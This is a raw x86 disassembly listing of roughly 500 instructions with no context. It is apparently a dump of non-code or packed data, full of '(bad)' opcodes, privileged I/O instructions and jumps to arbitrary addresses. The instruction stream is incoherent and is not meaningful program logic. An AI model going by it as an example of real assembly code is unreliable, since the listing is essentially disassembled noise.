  41fcd7:	(bad)  
  41fcd8:	dec    edi
  41fcd9:	lods   al,BYTE PTR ds:[esi]
  41fcda:	pop    ebp
  41fcdb:	pop    esp
  41fcdc:	iret   
  41fcdd:	clc    
  41fcde:	popa   
  41fcdf:	mov    WORD PTR ds:0x10985a09,ds
  41fce5:	in     al,0xfd
  41fce7:	xchg   edx,eax
  41fce8:	sub    DWORD PTR [edi+0x41ed4bb0],eax
  41fcee:	test   eax,0x15e056e3
  41fcf3:	push   0xe4c92da0
  41fcf8:	faddp  st(1),st
  41fcfa:	pop    eax
  41fcfb:	fnstenv [edi+0x7dac713d]
  41fd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd03:	rol    DWORD PTR [edi+0xf],cl
  41fd06:	sbb    edx,DWORD PTR [esi]
  41fd08:	jp     0x41fd05
  41fd0a:	jnp    0x41fd3d
  41fd0c:	pop    edi
  41fd0d:	xor    ch,BYTE PTR ds:0xb6208b2a
  41fd13:	sub    al,0x7b
  41fd15:	loope  0x41fca0
  41fd17:	xchg   edx,eax
  41fd18:	in     eax,dx
  41fd19:	loope  0x41fcf5
  41fd1b:	and    eax,esp
  41fd1d:	and    al,0xf4
  41fd1f:	add    BYTE PTR [edi+ebp*2+0x58164a5],ah
  41fd26:	jae    0x41fcdc
  41fd28:	xor    BYTE PTR ds:0x562eb543,bl
  41fd2e:	cmp    DWORD PTR [ebx-0x4b2a137a],ecx
  41fd34:	dec    ecx
  41fd35:	mov    eax,ds:0xccfa4f73
  41fd3a:	dec    ebx
  41fd3b:	push   0x6e
  41fd3d:	test   DWORD PTR [ecx+0x42fe1dd8],ebp
  41fd43:	(bad)  
  41fd44:	mov    al,ds:0xca881521
  41fd49:	sbb    BYTE PTR [eax-0x2a],0x81
  41fd4d:	stos   DWORD PTR es:[edi],eax
  41fd4e:	push   esp
  41fd4f:	mov    edi,0x6d69d34e
  41fd54:	loopne 0x41fdb4
  41fd56:	imul   esp,esi,0xffffffda
  41fd59:	jne    0x41fd74
  41fd5b:	call   0x653e2545
  41fd60:	outs   dx,BYTE PTR ds:[esi]
  41fd61:	jne    0x41fde2
  41fd63:	sub    al,0x8e
  41fd65:	imul   eax,DWORD PTR [ebp+eax*1+0x27f0c6b7],0x3b2d46d0
  41fd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd71:	hlt    
  41fd72:	in     al,0xe1
  41fd74:	loope  0x41fdb5
  41fd76:	xchg   edi,eax
  41fd77:	push   es
  41fd78:	add    DWORD PTR [edx],edi
  41fd7a:	fbld   TBYTE PTR [eax+0x6a33cd8b]
  41fd80:	mov    ah,0xde
  41fd82:	push   0xffffff94
  41fd84:	shl    DWORD PTR [ecx-0x2a],cl
  41fd87:	les    edi,FWORD PTR [esi+edx*4+0x26]
  41fd8b:	(bad)
  41fd8e:	jno    0x41fd79
  41fd90:	or     al,0xf
  41fd92:	sub    eax,0x88764dde
  41fd97:	rcr    ch,0x88
  41fd9a:	or     eax,0x76ee0345
  41fd9f:	cwde   
  41fda0:	aam    0x1
  41fda2:	push   0x46
  41fda4:	(bad)  
  41fda5:	pop    ecx
  41fda6:	popa   
  41fda7:	ret    
  41fda8:	pop    es
  41fda9:	xchg   ebp,eax
  41fdaa:	stc    
  41fdab:	add    esp,DWORD PTR [edx-0x68b2567e]
  41fdb1:	cld    
  41fdb2:	adc    ah,ah
  41fdb4:	add    BYTE PTR [ebx+0x35],dh
  41fdb7:	lods   al,BYTE PTR ds:[esi]
  41fdb8:	test   eax,0x25843a9b
  41fdbd:	inc    ebx
  41fdbe:	add    eax,0x5de8e3fa
  41fdc3:	adc    edi,DWORD PTR [eax]
  41fdc5:	pusha  
  41fdc6:	push   ecx
  41fdc7:	mov    ebp,ebx
  41fdc9:	int3   
  41fdca:	es xor dl,dh
  41fdcd:	cmp    al,0xbf
  41fdcf:	mov    eax,0x5d273702
  41fdd4:	cs push ss
  41fdd6:	xor    eax,0x9accf3ca
  41fddb:	sbb    eax,DWORD PTR [ebx]
  41fddd:	jmp    0xfe75:0xb7db53b0
  41fde4:	scas   al,BYTE PTR es:[edi]
  41fde5:	(bad)  
  41fde6:	fwait
  41fde7:	jmp    0xb77b5539
  41fdec:	xchg   ecx,eax
  41fded:	mov    edi,0x7b07723f
  41fdf2:	dec    ebp
  41fdf3:	mov    edi,0x9886c3a5
  41fdf8:	xlat   BYTE PTR ds:[ebx]
  41fdf9:	push   ebp
  41fdfa:	mov    ecx,0xec062fef
  41fdff:	gs out dx,al
  41fe01:	outs   dx,BYTE PTR ds:[esi]
  41fe02:	cmp    BYTE PTR [ecx-0x65bc34d5],ah
  41fe08:	data16 (bad) [ebp+0xf]
  41fe0c:	xchg   BYTE PTR [edx],ah
  41fe0e:	hlt    
  41fe0f:	addr16 dec ecx
  41fe11:	ins    DWORD PTR es:[edi],dx
  41fe12:	inc    ecx
  41fe13:	fs jecxz 0x41fe5a
  41fe16:	ins    BYTE PTR es:[edi],dx
  41fe17:	mov    DWORD PTR [edx],esi
  41fe19:	ret    0x3793
  41fe1c:	inc    esp
  41fe1d:	nop
  41fe1e:	popf   
  41fe1f:	sahf   
  41fe20:	es inc edi
  41fe22:	xor    eax,0x9b7045e3
  41fe27:	jae    0x41fdb7
  41fe29:	sub    BYTE PTR [edi],cl
  41fe2b:	std    
  41fe2c:	iret   
  41fe2d:	stc    
  41fe2e:	add    BYTE PTR [eax],cl
  41fe30:	repz sub ch,BYTE PTR [esi-0x2e]
  41fe34:	mov    cl,0x31
  41fe37:	enter  0xcbf7,0x93
  41fe3b:	es mov ah,0xd4
  41fe3e:	aaa    
  41fe3f:	mov    ebx,0xd3aca610
  41fe44:	push   esp
  41fe45:	pop    ebx
  41fe46:	call   DWORD PTR [esp+esi*4]
  41fe49:	adc    eax,0x72a3c92d
  41fe4e:	dec    ebx
  41fe4f:	dec    ecx
  41fe50:	shr    ebx,1
  41fe52:	js     0x41fe81
  41fe54:	enter  0x3def,0x15
  41fe58:	cmp    al,0x6e
  41fe5a:	fdivr  QWORD PTR [ebx]
  41fe5c:	pop    ebx
  41fe5d:	inc    esi
  41fe5e:	imul   ecx,DWORD PTR ds:0x8e36ba24,0xffffffdc
  41fe65:	ins    DWORD PTR es:[edi],dx
  41fe66:	jl     0x41fe9c
  41fe68:	lea    esp,[esi]
  41fe6a:	cmp    ah,BYTE PTR [ebp-0x14]
  41fe6d:	dec    ebx
  41fe6e:	jl     0x41fe58
  41fe70:	aas    
  41fe71:	std    
  41fe72:	std    
  41fe73:	lods   al,BYTE PTR ds:[esi]
  41fe74:	pop    esi
  41fe75:	ins    DWORD PTR es:[edi],dx
  41fe76:	test   eax,0x7617cb88
  41fe7b:	push   0xffffffc8
  41fe7d:	js     0x41fe5f
  41fe7f:	mov    ah,0x52
  41fe81:	push   eax
  41fe82:	test   eax,0xc90b76c4
  41fe87:	cmp    esp,DWORD PTR [ebx+0x36f67707]
  41fe8d:	out    dx,eax
  41fe8e:	and    BYTE PTR [eax-0x66],ah
  41fe91:	push   ds
  41fe92:	xchg   esi,eax
  41fe93:	ins    BYTE PTR es:[edi],dx
  41fe94:	pop    esp
  41fe95:	sar    DWORD PTR [eax-0x24],0x2a
  41fe99:	jmp    0x6e01:0xb9906dee
  41fea0:	int    0xeb
  41fea2:	out    0xcc,eax
  41fea4:	mov    ds:0x203c17ad,al
  41fea9:	mov    eax,0x35af2da7
  41feae:	fs inc esi
  41feb0:	xchg   edx,eax
  41feb1:	retf   
  41feb2:	lds    edx,FWORD PTR [ebx+0x32c7519e]
  41feb8:	sahf   
  41feb9:	or     ebx,DWORD PTR [eax-0x525875be]
  41febf:	mov    al,0x72
  41fec1:	test   BYTE PTR [edi-0x6a],dl
  41fec4:	shl    BYTE PTR [ebp-0x552ca82c],0x78
  41fecb:	push   esp
  41fecc:	jno    0x41fe62
  41fece:	xchg   edi,eax
  41fecf:	sar    ah,cl
  41fed1:	fwait
  41fed2:	cwde   
  41fed3:	sbb    al,cl
  41fed5:	ins    BYTE PTR es:[edi],dx
  41fed6:	add    ecx,DWORD PTR [ecx+ecx*2-0x54d1526c]
  41fedd:	in     al,dx
  41fede:	sar    DWORD PTR [edx-0x1b],1
  41fee1:	cmp    eax,0xa80b2086
  41fee6:	dec    ebp
  41fee7:	push   0xffffff96
  41fee9:	inc    ebp
  41feea:	ds je  0x41ff2e
  41feed:	add    eax,0x4af2d45b
  41fef2:	add    BYTE PTR [edi-0x35924abe],ch
  41fef8:	dec    ebx
  41fef9:	int    0xc6
  41fefb:	fld    TBYTE PTR [eax]
  41fefd:	lods   eax,DWORD PTR ds:[esi]
  41fefe:	jmp    0x41fee3
  41ff00:	and    al,0xaf
  41ff02:	aas    
  41ff03:	loope  0x41fe95
  41ff05:	xchg   esp,eax
  41ff06:	dec    esi
  41ff07:	push   esp
  41ff08:	or     eax,0x8d8c0fdf
  41ff0d:	push   edi
  41ff0e:	neg    BYTE PTR [ebx]
  41ff10:	mov    eax,0xe969e345
  41ff15:	jmp    0x73726cab
  41ff1a:	loope  0x41ff10
  41ff1c:	cdq    
  41ff1d:	jmp    0xff0bc0c2
  41ff22:	mov    ch,0x37
  41ff24:	sub    al,0x1c
  41ff26:	jno    0x41ff16
  41ff28:	push   esp
  41ff29:	in     eax,0xec
  41ff2b:	push   es
  41ff2c:	or     al,0x46
  41ff2e:	add    DWORD PTR [edi],0x5f68f31e
  41ff34:	jno    0x41fed3
  41ff36:	sbb    DWORD PTR [ebx+ecx*4+0x28],ecx
  41ff3a:	sbb    al,0xf9
  41ff3c:	jecxz  0x41ff70
  41ff3e:	mov    ecx,0x67c4e58e
  41ff43:	ins    BYTE PTR es:[edi],dx
  41ff44:	add    edx,DWORD PTR [ebp-0x13]
  41ff47:	mov    edx,0x3d66fa97
  41ff4c:	and    eax,0x6afc4a51
  41ff51:	jo     0x41ffc9
  41ff53:	repz test bh,cl
  41ff56:	cwde   
  41ff57:	pop    ebp
  41ff58:	xor    ebx,edi
  41ff5a:	dec    edx
  41ff5b:	ins    DWORD PTR es:[edi],dx
  41ff5c:	call   0x516e7838
  41ff61:	push   0xffffffe0
  41ff63:	mov    DWORD PTR [eax-0x5371a2ab],ecx
  41ff69:	xor    ebp,DWORD PTR [esi]
  41ff6b:	pop    edi
  41ff6c:	and    al,0xf8
  41ff6e:	loop   0x41ffd7
  41ff70:	into   
  41ff71:	inc    esi
  41ff72:	lods   al,BYTE PTR ds:[esi]
  41ff73:	xchg   ebp,eax
  41ff74:	ds jno 0x41ffcc
  41ff77:	(bad)  
  41ff78:	sti    
  41ff79:	ss stc 
  41ff7b:	(bad)  ds:0x887f5b9e
  41ff81:	stc    
  41ff82:	dec    esp
  41ff83:	mov    ds:0x620fed8b,eax
  41ff88:	sbb    ebp,esi
  41ff8a:	js     0x41ff4b
  41ff8c:	fld    DWORD PTR [ebx-0x32]
  41ff8f:	sbb    al,0xe4
  41ff91:	mov    eax,0x8994577f
  41ff96:	push   ebp
  41ff97:	popf   
  41ff98:	int    0x1b
  41ff9a:	cli    
  41ff9b:	and    al,BYTE PTR [ecx-0x3b]
  41ff9e:	inc    ebx
  41ff9f:	loopne 0x41ff6a
  41ffa1:	shl    BYTE PTR [esi-0x6118906f],0x2
  41ffa8:	mov    dh,0x21
  41ffaa:	mov    bh,0x24
  41ffac:	(bad)  
  41ffad:	std    
  41ffae:	repz dec ebx
  41ffb0:	sub    eax,ebp
  41ffb2:	jbe    0x41ffca
  41ffb4:	push   ecx
  41ffb5:	das    
  41ffb6:	sbb    al,0x35
  41ffb8:	loopne 0x420030
  41ffba:	push   esi
  41ffbb:	mov    al,ds:0x800397f
  41ffc0:	lea    esp,[edi-0x3448e170]
  41ffc6:	push   ebp
  41ffc7:	nop
  41ffc8:	sub    edi,eax
  41ffca:	aas    
  41ffcb:	mov    esp,0xfcaf9a10
  41ffd0:	xchg   edx,eax
  41ffd1:	mov    ds:0xd5f4ddb3,al
  41ffd6:	std    
  41ffd7:	imul   edx,DWORD PTR [eax],0x38
  41ffda:	and    ch,ah
  41ffdc:	pop    esi
  41ffdd:	popa   
  41ffde:	mov    WORD PTR [ecx+0x695ee4b9],ds
  41ffe4:	fld    DWORD PTR [esi-0x2a1e05d5]
  41ffea:	mov    ebx,0x8a54a84d
  41ffef:	repz or BYTE PTR [edi],ah
  41fff2:	mov    edi,0x9b53938d
  41fff7:	(bad)  
  41fff8:	pop    ds
  41fff9:	push   edx
  41fffa:	adc    ah,bl
  41fffc:	loopne 0x41ff7f
  41fffe:	imul   edi,DWORD PTR [edi-0x17],0x7b
  420002:	pusha  
  420003:	pop    ss
  420004:	jle    0x42000e
  420006:	vdivpd ymm0,ymm4,YMMWORD PTR [edx+ebx*2+0x20]
  42000c:	cwde   
  42000d:	fs jo  0x42008c
  420010:	(bad)
  420013:	fs pop ecx
  420015:	jp     0x420079
  420017:	xchg   edx,eax
  420018:	pop    es
  420019:	dec    ebp
  42001a:	inc    edi
  42001b:	jmp    0x6c85:0x2e955e09
  420022:	adc    dh,BYTE PTR ds:0x215a4bf3
  420028:	test   al,0x94
  42002a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42002b:	es aad 0xae
  42002e:	sub    al,0xce
  420030:	or     ebx,edi
  420032:	(bad)  
  420033:	jle    0x420004
  420035:	test   eax,0x27cddcff
  42003a:	mov    bl,0x29
  42003c:	or     BYTE PTR [eax+0x6869c64a],bl
  420042:	mov    dh,0xe1
  420044:	adc    BYTE PTR [esi-0x16b33f82],al
  42004a:	scas   al,BYTE PTR es:[edi]
  42004b:	int3   
  42004c:	fcomip st,st(7)
  42004e:	xchg   edi,eax
  42004f:	push   0xffffffda
  420051:	out    0xdb,al
  420053:	bound  ebp,QWORD PTR [eax+0x59bd4b0e]
  420059:	push   es
  42005a:	rol    esp,cl
  42005c:	push   ss
  42005d:	(bad)  
  42005e:	(bad)  
  42005f:	test   BYTE PTR [edi+0x35],ch
  420062:	shr    ch,0xd3
  420065:	sub    ch,bh
  420067:	out    dx,eax
  420068:	dec    BYTE PTR [esi+0x2728326a]
  42006e:	cmp    ah,dl
  420070:	inc    edi
  420071:	loop   0x4200be
  420073:	lods   al,BYTE PTR ds:[esi]
  420074:	cmp    al,0x24
  420076:	sbb    eax,0xae4a30b7
  42007b:	and    al,0x7e
  42007d:	stc    
  42007e:	xchg   ebp,eax
  42007f:	sub    BYTE PTR [edi],ah
  420081:	inc    ecx
  420082:	jne    0x420019
  420084:	mov    edx,0xbac87998
  420089:	mov    ds:0x444c0a7f,al
  42008e:	mov    edi,0xfbfedcda
  420093:	adc    DWORD PTR [esi+ebp*2+0x6ff4a9cd],ebx
  42009a:	push   es
  42009b:	loopne 0x420064
  42009d:	sbb    DWORD PTR [esp+eiz*2],ebp
  4200a0:	jbe    0x4200f4
  4200a2:	pop    ebp
  4200a3:	dec    edx
  4200a4:	leave  
  4200a5:	rcr    edx,1
  4200a7:	shl    BYTE PTR [eax+0x9178b74],0xf3
  4200ae:	add    eax,0x5d607113
  4200b3:	js     0x420062
  4200b5:	dec    ebp
  4200b6:	loopne 0x4200e7
  4200b8:	and    eax,0x47bc917f
  4200bd:	adc    al,BYTE PTR [ebx+0x47]
  4200c0:	ret    0x4ee3
  4200c3:	xabort 0x88
  4200c6:	daa    
  4200c7:	push   edi
  4200c8:	cmp    al,0xa0
  4200ca:	add    eax,0xb81c5f6b
  4200cf:	add    DWORD PTR [ebp+ebp*1-0x68],esi
  4200d3:	repnz popa 
  4200d5:	push   ebp
  4200d6:	push   0x13be74b
  4200db:	jo     0x4200f0
  4200dd:	outs   dx,BYTE PTR ds:[esi]
  4200de:	popa   
  4200df:	sub    eax,0xd196657a
  4200e4:	pop    edi
  4200e5:	pop    esi
  4200e6:	jnp    0x420080
  4200e8:	fsub   QWORD PTR [eax-0x104197e9]
  4200ee:	sub    esi,eax
  4200f0:	mov    dl,0xa1
  4200f2:	xor    cl,BYTE PTR ss:[edi]
  4200f5:	jnp    0x420110
  4200f7:	data16 icebp 
  4200f9:	out    0x65,eax
  4200fb:	push   ebp
  4200fc:	sar    ah,1
  4200fe:	imul   esi,DWORD PTR [eax-0x78cc89c9],0xf8d2e5b5
  420108:	jns    0x420180
  42010a:	inc    edi
  42010b:	sbb    al,0xe7
  42010d:	or     DWORD PTR [esi+0x6aeec4d],0xda4d3158
  420117:	fisttp DWORD PTR [ecx-0x1f]
  42011a:	dec    esi
  42011b:	hlt    
  42011c:	mov    ds:0x99d2f3e8,al
  420121:	mov    al,ds:0xd809f741
  420126:	leave  
  420127:	ret    0xbdfc
  42012a:	ins    BYTE PTR es:[edi],dx
  42012b:	popa   
  42012c:	sti    
  42012d:	fs push edx
  42012f:	popa   
  420130:	mov    eax,ds:0x483d1d09
  420135:	push   ss
  420136:	push   esp
  420137:	ds fs daa 
  42013a:	(bad)  
  42013b:	ins    DWORD PTR es:[edi],dx
  42013c:	xchg   esp,eax
  42013d:	jb     0x42010d
  42013f:	scas   al,BYTE PTR es:[edi]
  420140:	sub    al,0x20
  420142:	shr    DWORD PTR [eax],0xe
  420145:	fstp   DWORD PTR [edx-0x4d]
  420148:	xor    al,0xb
  42014a:	cmp    BYTE PTR [ebx+0x6e],bh
  42014d:	or     al,BYTE PTR [edx-0x24]
  420150:	inc    ecx
  420151:	mov    ds:0x753ea0ba,eax
  420156:	jns    0x420163
  420158:	mul    DWORD PTR [edi]
  42015a:	push   ebp
  42015b:	xchg   eax,edi
  42015d:	repnz enter 0x9421,0x76
  420162:	loope  0x42018d
  420164:	pop    ds
  420165:	daa    
  420166:	loop   0x4201b4
  420168:	or     ebp,DWORD PTR [ebx+ecx*8]
  42016b:	stc    
  42016c:	push   ebx
  42016d:	ja     0x4201a8
  42016f:	out    0x6c,eax
  420171:	loopne 0x420161
  420173:	or     ecx,eax
  420175:	mov    edi,es
  420177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420178:	sbb    al,0x1d
  42017a:	sub    al,0xd
  42017c:	mov    ch,cl
  42017e:	jl     0x4201c5
  420180:	in     eax,0x9
  420182:	push   ecx
  420183:	js     0x420109
  420185:	mov    al,0xea
  420187:	(bad)  
  420188:	jecxz  0x4201ee
  42018a:	loope  0x420189
  42018c:	fsub   st,st(7)
  42018e:	bound  esp,QWORD PTR [ebp+0x5d]
  420191:	mov    esp,?
  420193:	lock push 0x32
  420196:	iret   
  420197:	cmp    eax,0xd039039
  42019c:	inc    esp
  42019d:	xchg   edx,eax
  42019e:	sub    al,BYTE PTR [edx]
  4201a0:	ins    BYTE PTR es:[edi],dx
  4201a1:	test   eax,0x62b0dfaa
  4201a6:	cwde   
  4201a7:	push   ds
  4201a8:	jnp    0x4201da
  4201aa:	fldenv [eax+0x71]
  4201ad:	dec    esp
  4201ae:	in     al,0xdb
  4201b0:	cmp    edi,edi
  4201b2:	pop    eax
  4201b3:	rol    bl,cl
  4201b5:	adc    eax,0x81f3347a
  4201ba:	(bad)  
  4201bb:	jb     0x42015f
  4201bd:	xchg   ecx,eax
  4201be:	mov    ds:0xe608dc5c,eax
  4201c3:	push   ebx
  4201c4:	jnp    0x4201c0
  4201c6:	jecxz  0x42015a
  4201c8:	cli    
  4201c9:	xchg   DWORD PTR [ebx-0x234be432],edx
  4201cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201d0:	jnp    0x420162
  4201d2:	fsub   QWORD PTR [edi-0x12]
  4201d5:	and    edx,0x5c
  4201d8:	lds    eax,FWORD PTR [ebp+esi*4+0x70]
  4201dc:	add    dh,BYTE PTR [esi]
  4201de:	jecxz  0x420189
  4201e0:	or     ah,bl
  4201e2:	ds jle 0x42017b
  4201e5:	inc    ecx
  4201e6:	sbb    eax,0x1fe7a687
  4201eb:	in     al,dx
  4201ec:	xchg   ebp,eax
  4201ed:	pop    ds
  4201ee:	pushf  
  4201ef:	ror    BYTE PTR [edi+0x2e7ff40],1
  4201f5:	pop    es
  4201f6:	sbb    al,0x6e
  4201f8:	out    0x3b,al
  4201fa:	mov    ebx,0x70e48e0e
  4201ff:	dec    ebx
  420200:	mov    ebx,0xf82f224b
  420205:	adc    BYTE PTR [edx-0x63507241],0x68
  42020c:	out    0x66,eax
  42020e:	cmp    ch,BYTE PTR [edi+0x5d]
  420211:	adc    bl,BYTE PTR ds:[ecx]
  420214:	mov    BYTE PTR [esp+eax*8-0x714d51a0],dl
  42021b:	inc    eax
  42021c:	shl    ch,1
  42021e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42021f:	rol    BYTE PTR [ebp-0x14],cl
  420222:	dec    esp
  420223:	mov    ds:0x5f53c947,eax
  420228:	scas   al,BYTE PTR es:[edi]
  420229:	and    eax,DWORD PTR [edi+ecx*2]
  42022c:	rcl    BYTE PTR [edi-0x3f],cl
  42022f:	lods   eax,DWORD PTR ds:[esi]
  420230:	loop   0x420293
  420232:	cmp    ah,BYTE PTR [ebp-0x6f394554]
  420238:	repnz xlat BYTE PTR ds:[ebx]
  42023a:	iret   
  42023b:	ss shl ch,0xb7
  42023f:	xchg   BYTE PTR [edi],dl
  420241:	xchg   ecx,eax
  420242:	stc    
  420243:	mov    dl,0x3
  420245:	or     BYTE PTR [edx+0x66],al
  420248:	repz imul eax,DWORD PTR [edx],0x30
  42024c:	fs push cs
  42024e:	ins    BYTE PTR es:[edi],dx
  42024f:	loopne 0x4201fe
  420251:	sbb    eax,0xb0401c1b
  420256:	pop    ebx
  420257:	mov    ebp,0xba5a0b0
  42025c:	popf   
  42025d:	neg    DWORD PTR [ebx]
  42025f:	loope  0x420253
  420261:	jb     0x42023f
  420263:	cmp    BYTE PTR [edi+0xc697724],ch
  420269:	push   es
  42026a:	jge    0x42022c
  42026c:	adc    BYTE PTR [ebx+0xa893169],dh
  420272:	xor    edi,DWORD PTR [ecx+ebp*4-0x59beac59]
  420279:	mov    edx,0xdec3d364
  42027e:	sbb    al,0x86
  420280:	imul   esi,DWORD PTR [ecx+0x20],0x1760dd96
  420287:	neg    ecx
  420289:	adc    esi,ebp
  42028b:	les    edx,FWORD PTR [ebx+0x5d]
  42028e:	sub    BYTE PTR [esi-0x171116c0],ch
  420294:	test   al,0x1
  420296:	ss es retf 
  420299:	ins    DWORD PTR es:[edi],dx
  42029a:	imul   BYTE PTR [edi]
  42029c:	adc    dl,cl
  42029e:	out    0xce,al
  4202a0:	push   cs
  4202a1:	(bad)  
  4202a2:	(bad)  
  4202a4:	fcmovu st,st(3)
  4202a6:	cmp    BYTE PTR [ecx+ebx*1+0xc],cl
  4202aa:	adc    al,0x5a
  4202ac:	jbe    0x4202e7
  4202ae:	test   al,0xc0
  4202b0:	div    DWORD PTR [esi-0x32]
  4202b3:	push   edx
  4202b4:	jae    0x420310
  4202b6:	fwait
  4202b7:	test   BYTE PTR ds:0xd1aa1db5,bh
  4202bd:	push   0xfffffff9
  4202bf:	test   BYTE PTR [edi+0x62],0xcf
  4202c3:	in     eax,dx
  4202c4:	jns    0x420279
  4202c6:	sbb    bl,BYTE PTR [ebx]
  4202c8:	loop   0x420336
  4202ca:	lock ins DWORD PTR es:[edi],dx
  4202cc:	pop    ecx
  4202cd:	xchg   DWORD PTR [esi+0x3e69302b],eax
  4202d3:	cmp    ah,BYTE PTR [ecx+ebx*1+0x4]
  4202d7:	popf   
  4202d8:	test   DWORD PTR [ebx-0x2fe55590],ebx
  4202de:	(bad)  
  4202df:	popa   
  4202e0:	dec    esi
  4202e1:	mov    ss,WORD PTR [esp+ebx*8]
  4202e4:	add    bh,bl
  4202e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202e7:	mov    bh,BYTE PTR [esp+esi*8]
  4202ea:	pop    es
  4202eb:	mov    ch,0x68
  4202ed:	icebp  
  4202ee:	pop    esi
  4202ef:	push   esi
  4202f0:	cwde   
  4202f1:	lods   eax,DWORD PTR ds:[esi]
  4202f2:	and    bh,cl
  4202f4:	ins    BYTE PTR es:[edi],dx
  4202f5:	psubusb mm6,QWORD PTR [ebx-0x3e]
  4202f9:	push   ecx
  4202fa:	dec    ecx
  4202fb:	dec    ebx
  4202fc:	xlat   BYTE PTR ds:[ebx]
  4202fd:	adc    ebx,DWORD PTR [eax]
  4202ff:	mov    edx,eax
  420301:	mov    bl,0x2
  420303:	and    al,0x69
  420305:	jecxz  0x4202cd
  420307:	inc    esp
  420308:	in     al,0xcb
  42030a:	or     al,0xf
  42030c:	sar    BYTE PTR [ebx-0x1b],1
  42030f:	mov    ds:0x4aadf574,eax
  420314:	bound  esi,QWORD PTR [edx]
  420316:	push   ss
  420317:	dec    edi
  420318:	stc    
  420319:	mov    eax,0x57564380
  42031e:	add    ecx,DWORD PTR [esi-0x35]
  420321:	push   edx
  420322:	lea    ecx,[edi-0x4a]
  420325:	out    0xd8,al
  420327:	dec    al
  420329:	cmp    al,0xeb
  42032b:	sub    esp,DWORD PTR [ebx-0x26]
  42032e:	mov    ds,WORD PTR [ecx]
  420330:	or     esi,DWORD PTR [esp+esi*4-0x73]
  420334:	dec    edx
  420335:	jp     0x420327
  420337:	out    0x2e,eax
  420339:	push   ds
  42033a:	into   
  42033b:	les    ecx,FWORD PTR [ebx+0x52e5f1c4]
  420341:	ss mov bl,0x93
  420344:	jbe    0x42038b
  420346:	lock loope 0x4203b6
  420349:	push   edx
  42034a:	sbb    esi,DWORD PTR [ecx]
  42034c:	ret    
  42034d:	mov    ch,0xfc
  42034f:	aas    
  420350:	hlt    
  420351:	push   eax
  420352:	cdq    
  420353:	push   ebx
  420354:	jns    0x420334
  420356:	or     al,0xec
  420358:	push   0x3d
  42035a:	hlt    
  42035b:	and    ch,BYTE PTR [eax+0x359ae103]
  420361:	inc    ecx
  420362:	inc    edx
  420363:	sbb    al,0x47
  420365:	sahf   
  420366:	and    al,0x1
  420368:	mov    al,BYTE PTR ds:0x40f7e52b
  42036e:	cmp    al,0x1a
  420370:	cmp    DWORD PTR [edi-0x5386797c],esp
  420376:	and    DWORD PTR [ebx+0x37],ebx
  420379:	adc    DWORD PTR [ebp+0x773fd611],0x55
  420380:	mov    eax,ds:0x5a14cf9e
  420385:	pop    ds
  420386:	sbb    al,0x41
  420388:	inc    ebp
  420389:	inc    ebp
  42038a:	ret    
  42038b:	xor    DWORD PTR [edx+0x51],edx
  42038e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42038f:	sbb    eax,0x3bdbc8c3
  420394:	fst    DWORD PTR [esi]
  420396:	xchg   edi,eax
  420397:	xchg   esi,eax
  420398:	in     eax,dx
  420399:	mov    DWORD PTR [eax+edi*2+0x14],ecx
  42039d:	pop    edi
  42039e:	into   
  42039f:	addr16 in eax,0x72
  4203a2:	lds    eax,FWORD PTR [edx+eax*2]
  4203a5:	fsub   DWORD PTR [esi-0x68]
  4203a8:	xchg   ebp,eax
  4203a9:	rol    DWORD PTR ds:0x28559e20,cl
  4203af:	inc    ax
  4203b1:	sbb    eax,0x46e58335
  4203b6:	test   eax,0x5d21f48c
  4203bb:	pushf  
  4203bc:	xchg   ecx,eax
  4203bd:	fidivr WORD PTR [edx+0x61]
  4203c0:	pushf  
  4203c1:	cwde   
  4203c2:	cmc    
  4203c3:	fs ins BYTE PTR es:[edi],dx
  4203c5:	pop    ss
  4203c6:	ja     0x42034d
  4203c8:	cld    
  4203c9:	scas   eax,DWORD PTR es:[edi]
  4203ca:	test   eax,0x8bc5cf78
  4203cf:	scas   al,BYTE PTR es:[edi]
  4203d0:	dec    ecx
  4203d1:	or     edi,DWORD PTR [esi+ecx*4+0x5dc7c67c]
  4203d8:	sbb    esp,DWORD PTR [bp+si]
  4203db:	frstor [ebp+0x64f6de71]
  4203e1:	cmp    eax,0x3c136938
  4203e6:	retf   0xfe0c
  4203e9:	inc    ebx
  4203ea:	loope  0x420393
  4203ec:	rcr    DWORD PTR [edx-0x13301917],1
  4203f2:	aad    0xe4
  4203f4:	jecxz  0x420473
  4203f6:	adc    edx,DWORD PTR cs:[ecx+esi*8]
  4203fa:	inc    eax
  4203fb:	mov    al,0x1f
  4203fd:	or     DWORD PTR [esi-0x6a],ecx
  420400:	test   BYTE PTR [ebp-0x4c24d30b],dl
  420406:	jb     0x4203b8
  420408:	xchg   ebx,eax
  420409:	dec    ecx
  42040a:	add    eax,edx
  42040c:	push   esp
  42040d:	and    al,0x86
  42040f:	pop    es
  420410:	add    dl,BYTE PTR [ecx]
  420412:	push   ebx
  420413:	leave  
  420414:	lods   eax,DWORD PTR ds:[esi]
  420415:	pusha  
  420416:	sbb    eax,0x16c07385
  42041b:	xchg   ebx,esp
  42041d:	dec    ecx
  42041e:	ror    BYTE PTR [ebx],1
  420420:	shl    BYTE PTR [eax+0x5c596f95],0xe
  420427:	mov    cl,0x36
  420429:	out    0x19,eax
  42042b:	sar    dl,cl
  42042d:	pop    ecx
  42042e:	mov    DWORD PTR [ebx+0x62726d1a],0x1c15d9f4
  420438:	je     0x4203cd
  42043a:	ret    0xc4b2
  42043d:	xchg   ebx,eax
  42043e:	mov    ecx,0xfc0d1fb9
  420443:	pop    esp
  420444:	xchg   DWORD PTR [edi+0x3e335a4a],eax
  42044a:	mov    esi,0x41e499c
  42044f:	nop
  420450:	mov    ch,bh
  420452:	sub    ecx,DWORD PTR [ebp-0x2eaa3429]
  420458:	sub    bl,BYTE PTR [ebx+0x12]
  42045b:	ins    BYTE PTR es:[edi],dx
  42045c:	jecxz  0x4204ca
  42045e:	xchg   edi,eax
  42045f:	push   eax
  420460:	mov    al,0xff
  420462:	cld    
  420463:	jae    0x42045d
  420465:	fnstcw WORD PTR ds:0xe90b30a6
  42046b:	outs   dx,BYTE PTR ds:[esi]
